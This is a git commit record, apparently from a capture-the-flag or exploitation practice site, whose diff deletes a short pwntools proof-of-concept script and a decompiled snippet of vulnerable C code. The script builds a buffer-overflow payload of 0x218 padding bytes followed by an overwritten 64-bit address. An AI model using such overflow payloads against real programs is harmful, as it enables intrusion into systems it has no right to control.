d6c398f71943e879e0f1e8f9d920f1998e2596f3
pwn_expoit <pwn_expoit@naver.com>
2016-02-06 06:51:54 -0800

    Site updated at 2016-02-06 14:51:54 UTC

--- codeview/readmepoc.py
+++
@@ -1,8 +0,0 @@
-
-from pwn import *
-dat  = ""
-dat += "A"*0x218
-dat += p64(0x600D20)
-
-print dat+"\n"+"1234\n"
-
--- codeview/vuln.c
+++
@@ -1,5 +0,0 @@
-  for ( i = 0; i <= 0x13; ++i )
-  {
-    printf("[FREE][address=%X]\n", *(&v4 + 2 * i));
-    free((void *)*(&v4 + 2 * i));
-  }
